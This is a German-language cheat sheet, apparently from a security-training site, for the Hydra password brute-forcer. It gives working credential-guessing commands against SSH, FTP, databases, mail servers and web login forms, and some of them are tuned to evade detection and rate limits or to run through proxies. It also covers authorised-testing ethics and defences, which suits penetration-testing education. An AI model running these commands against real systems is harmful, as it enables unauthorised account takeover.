---
title: 'Hydra Spickzettel'
description: 'Lernen Sie Hydra mit unserem umfassenden Spickzettel, der wesentliche Befehle, Konzepte und Best Practices abdeckt.'
pdfUrl: '/cheatsheets/pdf/hydra-cheatsheet.pdf'
---

<base-title :title="frontmatter.title" :description="frontmatter.description">
Hydra Spickzettel
</base-title>

<base-pdf-url :url="frontmatter.pdfUrl" />

<base-disclaimer>
<base-disclaimer-title>
<a target="_blank" href="https://labex.io/de/learn/hydra">Lernen Sie Hydra mit praktischen Labs</a>
</base-disclaimer-title>
<base-disclaimer-content>
Lernen Sie Hydra Passwort-Cracking und Penetrationstests durch praktische Labs und reale Szenarien. LabEx bietet umfassende Hydra-Kurse zu Protokollangriffen, Webformular-Exploits, Leistungsoptimierung und ethischer Nutzung. Meistern Sie Brute-Force-Techniken für autorisierte Sicherheitstests und Schwachstellenbewertungen.
</base-disclaimer-content>
</base-disclaimer>

## Grundlegende Syntax & Installation

### Installation: `sudo apt install hydra`

Hydra ist normalerweise auf Kali Linux vorinstalliert, kann aber auch auf anderen Distributionen installiert werden.

```bash
# Installation auf Debian/Ubuntu-Systemen
sudo apt install hydra
# Installation auf anderen Systemen
sudo apt-get install hydra
# Installation überprüfen
hydra -h
# Unterstützte Protokolle prüfen
hydra
```

### Grundlegende Syntax: `hydra [optionen] ziel dienst`

Grundlegende Syntax: `hydra -l <benutzername> -P <passwortdatei> <zielprotokoll>://<zieladresse>`

```bash
# Einzelner Benutzername, Passwortliste
hydra -l benutzername -P passwoerter.txt ziel.com ssh
# Benutzername-Liste, Passwortliste
hydra -L benutzer.txt -P passwoerter.txt ziel.com ssh
# Einzelner Benutzername, einzelnes Passwort
hydra -l admin -p passwort123 192.168.1.100 ftp
```

### Kernoptionen: `-l`, `-L`, `-p`, `-P`

Geben Sie Benutzernamen und Passwörter für Brute-Force-Angriffe an.

```bash
# Benutzername-Optionen
-l benutzername          # Einzelner Benutzername
-L benutzerliste.txt      # Benutzername-Listen-Datei
# Passwort-Optionen
-p passwort          # Einzelnes Passwort
-P passwortliste.txt  # Passwort-Listen-Datei
# Gängige Wortlisten-Speicherorte
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/metasploit/unix_passwords.txt
```

### Ausgabeoptionen: `-o`, `-b`

Ergebnisse zur späteren Analyse in einer Datei speichern.

```bash
# Ergebnisse in Datei speichern
hydra -l admin -P passwoerter.txt ziel.com ssh -o ergebnisse.txt
# JSON-Ausgabeformat
hydra -l admin -P passwoerter.txt ziel.com ssh -b json
# Ausführliche Ausgabe
hydra -l admin -P passwoerter.txt ziel.com ssh -V
```

## Protokollspezifische Angriffe

### SSH: `hydra ziel ssh`

Angriff auf SSH-Dienste mit Benutzername- und Passwortkombinationen.

```bash
# Basis-SSH-Angriff
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
# Mehrere Benutzernamen
hydra -L benutzer.txt -P passwoerter.txt ssh://192.168.1.100
# Benutzerdefinierter SSH-Port
hydra -l admin -P passwoerter.txt 192.168.1.100 -s 2222 ssh
# Mit Threading
hydra -l root -P passwoerter.txt -t 6 ssh://192.168.1.100
```

### FTP: `hydra ziel ftp`

Brute-Force von FTP-Anmeldeinformationen.

```bash
# Basis-FTP-Angriff
hydra -l admin -P passwoerter.txt ftp://192.168.1.100
# Anonymer FTP-Check
hydra -l anonymous -p "" ftp://192.168.1.100
# Benutzerdefinierter FTP-Port
hydra -l user -P passwoerter.txt -s 2121 192.168.1.100 ftp
```

### Datenbankangriffe: `mysql`, `postgres`, `mssql`

Angriff auf Datenbankdienste durch Brute-Force von Anmeldeinformationen.

```bash
# MySQL-Angriff
hydra -l root -P passwoerter.txt 192.168.1.100 mysql
# PostgreSQL-Angriff
hydra -l postgres -P passwoerter.txt 192.168.1.100 postgres
# MSSQL-Angriff
hydra -l sa -P passwoerter.txt 192.168.1.100 mssql
# MongoDB-Angriff
hydra -l admin -P passwoerter.txt 192.168.1.100 mongodb
```

### SMTP/E-Mail: `hydra ziel smtp`

Angriff auf die Authentifizierung von E-Mail-Servern.

```bash
# SMTP Brute-Force
hydra -l admin -P passwoerter.txt smtp://mail.ziel.com
# Mit Null-/leeren Passwörtern
hydra -P passwoerter.txt -e ns -V -s 25 smtp.ziel.com smtp
# IMAP-Angriff
hydra -l user -P passwoerter.txt imap://mail.ziel.com
```

## Angriffe auf Webanwendungen

### HTTP POST-Formulare: `http-post-form`

Angriff auf Web-Login-Formulare mit der HTTP POST-Methode unter Verwendung der Platzhalter `^USER^` und `^PASS^`.

```bash
# Basis-POST-Formular-Angriff
hydra -l admin -P passwoerter.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# Mit benutzerdefinierter Fehlermeldung
hydra -l admin -P passwoerter.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:Ungültiges Passwort"
# Mit Erfolgsbedingung
hydra -l admin -P passwoerter.txt 192.168.1.100 http-post-form "/admin:username=^USER^&password=^PASS^:S=Dashboard"
```

### HTTP GET-Formulare: `http-get-form`

Ähnlich wie POST-Formulare, zielt aber auf GET-Anfragen ab.

```bash
# GET-Formular-Angriff
hydra -l admin -P passwoerter.txt 192.168.1.100 http-get-form "/login:username=^USER^&password=^PASS^:F=Invalid"
# Mit benutzerdefinierten Headern
hydra -l admin -P passwoerter.txt 192.168.1.100 http-get-form "/auth:user=^USER^&pass=^PASS^:F=Error:H=Cookie: session=abc123"
```

### HTTP Basic Auth: `http-get`/`http-post`

Angriff auf Webserver mit HTTP Basic Authentication.

```bash
# HTTP Basic Authentication
hydra -l admin -P passwoerter.txt http-get://192.168.1.100
# HTTPS Basic Authentication
hydra -l admin -P passwoerter.txt https-get://secure.ziel.com
# Mit benutzerdefiniertem Pfad
hydra -l admin -P passwoerter.txt http-get://192.168.1.100/admin
```

### Erweiterte Web-Angriffe

Umgang mit komplexen Webanwendungen mit CSRF-Tokens und Cookies.

```bash
# Mit CSRF-Token-Handling
hydra -l admin -P passwoerter.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^&csrf=^CSRF^:F=Error:H=Cookie: csrf=^CSRF^"
# Mit Session-Cookies
hydra -l admin -P passwoerter.txt 192.168.1.100 http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: PHPSESSID=abc123"
```

## Leistungs- & Threading-Optionen

### Threading: `-t` (Aufgaben)

Steuert die Anzahl gleichzeitiger Angriffsverbindungen während des Angriffs.

```bash
# Standard-Threading (16 Aufgaben)
hydra -l admin -P passwoerter.txt ziel.com ssh
# Benutzerdefinierte Thread-Anzahl
hydra -l admin -P passwoerter.txt -t 4 ziel.com ssh
# Hochleistungsangriff (vorsichtig verwenden)
hydra -l admin -P passwoerter.txt -t 64 ziel.com ssh
# Konservatives Threading (Erkennung vermeiden)
hydra -l admin -P passwoerter.txt -t 1 ziel.com ssh
```

### Wartezeit: `-w` (Verzögerung)

Fügt Verzögerungen zwischen den Versuchen hinzu, um Ratenbegrenzungen und Erkennung zu vermeiden.

```bash
# 30 Sekunden Wartezeit zwischen den Versuchen
hydra -l admin -P passwoerter.txt -w 30 ziel.com ssh
# Kombiniert mit Threading
hydra -l admin -P passwoerter.txt -t 2 -w 10 ziel.com ssh
# Zufällige Verzögerung (1-5 Sekunden)
hydra -l admin -P passwoerter.txt -W 5 ziel.com ssh
```

### Mehrere Ziele: `-M` (Zieldatei)

Greifen Sie mehrere Hosts an, indem Sie diese in einer Datei angeben.

```bash
# Zieldatei erstellen
echo "192.168.1.100" > ziele.txt
echo "192.168.1.101" >> ziele.txt
echo "192.168.1.102" >> ziele.txt
# Mehrere Ziele angreifen
hydra -L benutzer.txt -P passwoerter.txt -M ziele.txt ssh
# Mit benutzerdefiniertem Threading pro Ziel
hydra -L benutzer.txt -P passwoerter.txt -M ziele.txt -t 2 ssh
```

### Fortsetzen & Stopp-Optionen

Unterbrochene Angriffe fortsetzen und das Stoppverhalten steuern.

```bash
# Nach dem ersten Erfolg stoppen
hydra -l admin -P passwoerter.txt -f ziel.com ssh
# Vorherigen Angriff fortsetzen
hydra -R
# Wiederherstellungsdatei erstellen
hydra -l admin -P passwoerter.txt -I wiederherstellung.txt ziel.com ssh
```

## Erweiterte Funktionen & Optionen

### Passwortgenerierung: `-e` (Zusätzliche Tests)

Testet automatisch zusätzliche Passwortvarianten.

```bash
# Null-Passwörter testen
hydra -l admin -e n ziel.com ssh
# Benutzernamen als Passwort testen
hydra -l admin -e s ziel.com ssh
# Benutzernamen umgekehrt testen
hydra -l admin -e r ziel.com ssh
# Alle Optionen kombinieren
hydra -l admin -e nsr -P passwoerter.txt ziel.com ssh
```

### Durch Doppelpunkt getrenntes Format: `-C`

Verwendet Benutzername:Passwort-Kombinationen, um die Angriffszeit zu verkürzen.

```bash
# Anmeldeinformationsdatei erstellen
echo "admin:admin" > creds.txt
echo "root:passwort" >> creds.txt
echo "user:123456" >> creds.txt
# Doppelpunktformat verwenden
hydra -C creds.txt ziel.com ssh
# Schneller als das Testen aller Kombinationen
```

### Proxy-Unterstützung: `HYDRA_PROXY`

Verwendet Proxy-Server für Angriffe über Umgebungsvariablen.

```bash
# HTTP-Proxy
export HYDRA_PROXY=connect://proxy.beispiel.com:8080
hydra -l admin -P passwoerter.txt ziel.com ssh
# SOCKS4-Proxy mit Authentifizierung
export HYDRA_PROXY=socks4://user:pass@127.0.0.1:1080
# SOCKS5-Proxy
export HYDRA_PROXY=socks5://proxy.beispiel.com:1080
```

### Passwortlisten-Optimierung: `pw-inspector`

Verwendet pw-inspector, um Passwortlisten basierend auf Richtlinien zu filtern.

```bash
# Passwörter filtern (mindestens 6 Zeichen, 2 Zeichenklassen)
cat passwoerter.txt | pw-inspector -m 6 -c 2 -n > gefiltert.txt
# Gefilterte Liste mit Hydra verwenden
hydra -l admin -P gefiltert.txt ziel.com ssh
# Duplikate zuerst entfernen
cat passwoerter.txt | sort | uniq > eindeutige_passwoerter.txt
```

## Ethische Nutzung & Best Practices

### Rechtliche und ethische Richtlinien

Es ist möglich, Hydra sowohl legal als auch illegal zu verwenden. Holen Sie vor der Durchführung von Brute-Force-Angriffen eine angemessene Genehmigung und Zustimmung ein.

```text
Führen Sie Angriffe nur auf Systemen durch, für die eine ausdrückliche Genehmigung erteilt wurde
Stellen Sie immer sicher, dass Sie die ausdrückliche Genehmigung des Systembesitzers oder Administrators haben
Dokumentieren Sie alle Testaktivitäten für die Einhaltung von Vorschriften
Nur bei autorisierten Penetrationstests verwenden
Niemals für unbefugte Zugriffsversuche verwenden
```

### Abwehrmaßnahmen

Schützen Sie sich vor Brute-Force-Angriffen mit starken Passwörtern und Richtlinien.

```text
Implementieren Sie Kontosperrrichtlinien, um Konten nach fehlgeschlagenen Versuchen vorübergehend zu sperren
Verwenden Sie Multi-Faktor-Authentifizierung (MFA)
Implementieren Sie CAPTCHA-Systeme, um Automatisierungstools zu verhindern
Überwachen und protokollieren Sie Authentifizierungsversuche
Implementieren Sie Ratenbegrenzung und IP-Blockierung
```

### Test-Best Practices

Beginnen Sie mit konservativen Einstellungen und dokumentieren Sie alle Aktivitäten zur Transparenz.

```text
Beginnen Sie mit niedrigen Thread-Zahlen, um Dienstunterbrechungen zu vermeiden
Verwenden Sie Wortlisten, die für die Zielumgebung geeignet sind
Testen Sie nach Möglichkeit während genehmigter Wartungsfenster
Überwachen Sie die Leistung des Zielsystems während des Tests
Halten Sie Verfahren für die Reaktion auf Vorfälle bereit
```

### Häufige Anwendungsfälle

Sowohl rote als auch blaue Teams profitieren von Passwort-Audits, Sicherheitsbewertungen und Penetrationstests.

```text
Passwort-Cracking zur Identifizierung schwacher Passwörter und zur Bewertung der Passwortstärke
Sicherheitsaudits von Netzwerkdiensten
Penetrationstests und Schwachstellenbewertungen
Compliance-Tests für Passwortrichtlinien
Schulungs- und Demonstrationszwecke
```

## GUI-Alternative & Zusätzliche Tools

### XHydra: GUI-Oberfläche

XHydra ist eine GUI für Hydra, mit der Konfigurationen über die GUI anstelle von Befehlszeilen-Switches ausgewählt werden können.

```bash
# XHydra GUI starten
xhydra
# Installieren, falls nicht verfügbar
sudo apt install hydra-gtk
# Funktionen:
# - Point-and-Click-Oberfläche
# - Vorkonfigurierte Angriffsvorlagen
# - Visuelle Fortschrittsüberwachung
# - Einfache Auswahl von Zielen und Wortlisten
```

### Hydra Wizard: Interaktive Einrichtung

Interaktiver Assistent, der Benutzer mit einfachen Fragen durch die Hydra-Einrichtung führt.

```bash
# Interaktiven Assistenten starten
hydra-wizard
# Der Assistent fragt nach:
# 1. Anzugreifender Dienst
# 2. Anzugreifendes Ziel
# 3. Benutzername oder Benutzerdateiname
# 4. Passwort oder Passwortdatei
# 5. Zusätzliche Passworttests
# 6. Portnummer
# 7. Endgültige Bestätigung
```

### Standard-Passwortlisten: `dpl4hydra`

Generiert Standard-Passwortlisten für bestimmte Marken und Systeme.

```bash
# Standard-Passwortdatenbank aktualisieren
dpl4hydra refresh
# Liste für eine bestimmte Marke generieren
dpl4hydra cisco
dpl4hydra netgear
dpl4hydra linksys
# Generierte Listen verwenden
hydra -C dpl4hydra_cisco.lst 192.168.1.1 ssh
# Alle Marken
dpl4hydra all
```

### Integration mit anderen Tools

Kombinieren Sie Hydra mit Aufklärungs- und Enumerationstools.

```bash
# Kombinieren mit Nmap-Dienst-Erkennung
nmap -sV 192.168.1.0/24 | grep -E "(ssh|ftp|http)"
# Verwenden mit Ergebnissen der Benutzernamens-Enumeration
enum4linux 192.168.1.100 | grep "user:" > benutzer.txt
# Integration mit Metasploit-Wortlisten
ls /usr/share/wordlists/metasploit/
```

## Fehlerbehebung & Leistung

### Häufige Probleme & Lösungen

Beheben Sie typische Probleme, die bei der Verwendung von Hydra auftreten.

```bash
# Verbindungs-Timeout-Fehler
hydra -l admin -P passwoerter.txt -t 1 -w 30 ziel.com ssh
# Fehler bei zu vielen Verbindungen
hydra -l admin -P passwoerter.txt -t 2 ziel.com ssh
# Optimierung der Speichernutzung
hydra -l admin -P kleine_liste.txt ziel.com ssh
# Unterstützte Protokolle prüfen
hydra
# Nach dem Protokoll in der Liste der unterstützten Dienste suchen
```

### Leistungsoptimierung

Optimieren Sie Passwortlisten und sortieren Sie sie nach Wahrscheinlichkeit für schnellere Ergebnisse.

```bash
# Passwörter nach Wahrscheinlichkeit sortieren
hydra -l admin -P passwoerter.txt -u ziel.com ssh
# Duplikate entfernen
sort passwoerter.txt | uniq > saubere_passwoerter.txt
# Threading basierend auf dem Ziel optimieren
# Lokales Netzwerk: -t 16
# Internet-Ziel: -t 4
# Langsamer Dienst: -t 1
```

### Ausgabeformate & Analyse

Verschiedene Ausgabeformate für die Analyse von Ergebnissen und Berichterstattung.

```bash
# Standard-Textausgabe
hydra -l admin -P passwoerter.txt ziel.com ssh -o ergebnisse.txt
# JSON-Format zur Analyse
hydra -l admin -P passwoerter.txt ziel.com ssh -b json -o ergebnisse.json
# Ausführliche Ausgabe zum Debuggen
hydra -l admin -P passwoerter.txt ziel.com ssh -V
# Nur Erfolgs-Ausgabe
hydra -l admin -P passwoerter.txt ziel.com ssh | grep "passwort:"
```

### Ressourcenüberwachung

Überwachen Sie System- und Netzwerkressourcen während Angriffen.

```bash
# CPU-Auslastung überwachen
top -p $(pidof hydra)
# Netzwerkverbindungen überwachen
netstat -an | grep :22
# Speichernutzung überwachen
ps aux | grep hydra
# Systemauswirkungen begrenzen
nice -n 19 hydra -l admin -P passwoerter.txt ziel.com ssh
```

## Relevante Links

- <router-link to="/kali">Kali Linux Spickzettel</router-link>
- <router-link to="/cybersecurity">Cybersecurity Spickzettel</router-link>
- <router-link to="/nmap">Nmap Spickzettel</router-link>
- <router-link to="/wireshark">Wireshark Spickzettel</router-link>
- <router-link to="/comptia">CompTIA Spickzettel</router-link>
- <router-link to="/linux">Linux Spickzettel</router-link>
- <router-link to="/shell">Shell Spickzettel</router-link>
- <router-link to="/devops">DevOps Spickzettel</router-link>
